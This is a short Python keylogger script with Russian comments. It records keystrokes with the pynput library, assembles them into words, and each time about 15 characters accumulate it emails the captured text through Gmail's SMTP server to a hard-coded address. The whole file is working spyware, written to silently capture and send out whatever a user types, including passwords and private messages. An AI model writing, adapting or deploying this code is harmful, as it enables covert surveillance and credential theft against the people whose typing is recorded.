import os
import smtplib
from pynput.keyboard import Key, Listener

word = ''
full_log = ''
chars_limit = 15


def keylogger(key):
    global word  # слово
    global full_log
    global chars_limit  # макс длина после которой отправляется лог

    # обработка начала клавиш
    if key == Key.space or key == Key.enter:
        word += " "
        full_log += word  # записываем слово в лог
        word = "" # обнуляем занчение word

        if len(full_log) >= chars_limit:
            # print(full_log)
            #
            # with open("log_file.txt", "w") as file:
            #     file.write(full_log)
            send_mail()
            full_log = ""

    elif key == Key.backspace:
        word = word[:-1] # убираем у слова послежний символ
    elif key == Key.shift_l or key == Key.shift_r:
        return
    else:
        # print(key)
        # print(type(key))
        char = f"{key}"
        char = char[1:-1]
        # print(char)
        word += char

    if key == Key.esc:
        return False # завершаем программу по нажатию клавиши Esc

def send_mail():
    sender = "daniil.chrkv@skyeng.ru"
    password = os.getenv("")
    
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls() # шифрованный обмен по tls
    server.login(sender, password)
    server.sendmail(sender, sender, full_log.encode("utf-8"))

def main():
    with Listener(on_press=keylogger) as log:
        log.join()


if __name__ == '__main__':
    main()
